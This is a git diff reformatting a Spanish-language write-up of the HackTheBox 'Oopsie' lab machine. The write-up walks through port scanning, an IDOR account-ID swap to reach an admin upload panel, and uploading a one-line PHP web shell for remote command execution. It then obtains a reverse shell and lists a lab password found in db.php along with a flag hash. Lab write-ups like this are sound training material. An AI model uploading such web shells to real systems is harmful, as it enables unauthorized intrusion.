@@ -1,69 +1,59 @@
 # Oopsie
 
-Plataforma: HackTheBox
-OS: Linux
-Level: Very Easy
-Status: Done
-Complete: Yes
-EJPT: yes
-Created time: 24 de diciembre de 2024 16:01
-IP: 10.129.105.138
+Plataforma: HackTheBox OS: Linux Level: Very Easy Status: Done Complete: Yes EJPT: yes Created time: 24 de diciembre de 2024 16:01 IP: 10.129.105.138
 
 ## Recopilación de información
 
-<aside>
 💡 Reconocimiento inicial
-
-</aside>
 
 ### **Escaneo de puertos**
 
 Comenzamos con un escaneo para identificar que puertos están abiertos.
 
----
+***
 
 ```bash
 sudo -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.105.138 -oG allports
 ```
 
-![image.png](/images/HackTheBox/image.png)
+![image.png](<../../.gitbook/assets/image (1).png>)
 
 ### **Enumeración de servicios**
 
 Una vez listado los puertos accesibles, procederemos a realizar la enumeración de servicios para su posterior identificación de vulnerabilidades.
 
----
+***
 
 ```bash
 sudo nmap -p22,80 -sCV 10.129.105.138 -oN targeted
 ```
 
-![image.png](/images/HackTheBox/image%201.png)
+![image.png](<../../.gitbook/assets/image 1 (1).png>)
 
-- **Identificación de vulnerabilidades**
-    - 22 SSH: Encotramos clave SSH RSA
-    
-    ![image.png](/images/HackTheBox/image%202.png)
-    
-    - 80
-    
+*   **Identificación de vulnerabilidades**
+
+    * 22 SSH: Encotramos clave SSH RSA
+
+    ![image.png](<../../.gitbook/assets/image 2 (1).png>)
+
+    * 80
+
     ```bash
     whatweb 10.129.105.138
     ```
-    
 
-![image.png](/images/HackTheBox/image%203.png)
+![image.png](<../../.gitbook/assets/image 3 (1).png>)
 
 ```bash
 feroxbuster --url http://10.129.105.138
 
 ```
 
-![image.png](/images/HackTheBox/image%204.png)
+![image.png](<../../.gitbook/assets/image 4 (1).png>)
 
 Encontramos ruta : /cdn-cgi/login
 
-![image.png](/images/HackTheBox/image%205.png)
+![image.png](<../../.gitbook/assets/image 5 (1).png>)
 
 Al no disponer de credenciales, accedmos como “Guest”
 
@@ -71,7 +61,7 @@ Enumeramos la web :
 
 Account con ID = 2
 
-![image.png](/images/HackTheBox/image%206.png)
+![image.png](<../../.gitbook/assets/image 6 (1).png>)
 
 Cambiamos el ID a 1 y encontramos usuario admin con ID: 34322
 
@@ -81,22 +71,19 @@ Mail : john@tafcz.co.uk
 
 Name: Tafcz
 
-![image.png](/images/HackTheBox/image%207.png)
+![image.png](<../../.gitbook/assets/image 7 (1).png>)
 
 ## Explotación
 
-<aside>
 💡
-
-</aside>
 
 ### Explotación 1
 
-Mediante Burpsuite, interceptamos la peticion y cambiamos el id por el 34322 y admin , para acceder al panel “Upload” 
+Mediante Burpsuite, interceptamos la peticion y cambiamos el id por el 34322 y admin , para acceder al panel “Upload”
 
-![image.png](/images/HackTheBox/image%208.png)
+![image.png](<../../.gitbook/assets/image 8 (1).png>)
 
-![image.png](/images/HackTheBox/image%209.png)
+![image.png](<../../.gitbook/assets/image 9 (1).png>)
 
 Probamos a subir el una shell para RCE :
 
@@ -104,42 +91,39 @@ Probamos a subir el una shell para RCE :
 <?php echo "<pre>" . system($_GET['cmd']) . "</pre>"; ?>
 ```
 
-![image.png](/images/HackTheBox/image%2010.png)
+![image.png](<../../.gitbook/assets/image 10 (1).png>)
 
 Tratamos de acceder:
 
-![image.png](/images/HackTheBox/image%2011.png)
+![image.png](<../../.gitbook/assets/image 11 (1).png>)
 
 Tenemos ejecucción remota de comandos
 
 Tratamos de ejecutar una revershell:
 
-Subimos revershell de pentestmonkey y obtenemos revershell 
+Subimos revershell de pentestmonkey y obtenemos revershell
 
-![image.png](/images/HackTheBox/image%2012.png)
+![image.png](<../../.gitbook/assets/image 12 (1).png>)
 
-### 
+###
 
 ## Explotación posterior
 
-<aside>
 💡 Escalamos privilegios desde www-data
-
-</aside>
 
 ### Escalada de privilegios
 
 Una vez accedemos, enumeramos el sistema y encontramos como migrar a usuario robert en db.php
 
-![image.png](/images/HackTheBox/image%2013.png)
+![image.png](<../../.gitbook/assets/image 13 (1).png>)
 
 User: robert
 
 Password: M3g4C0rpUs3r!
 
-![image.png](/images/HackTheBox/image%2014.png)
+![image.png](<../../.gitbook/assets/image 14 (1).png>)
 
-Buscamos binarios SUID. 
+Buscamos binarios SUID.
 
 No podemos ejecutar sudo -l
 
@@ -249,7 +233,4 @@ af13b0bee69f8a877c3faf667f7beacf
 
 ## Conclusión
 
-<aside>
 💡 Maquina facil. Para recordar buscar binarios SUID a mano si no funciona sudo -l y tener presente siempre el acceso a binarios con rutas relativas
-
-</aside>
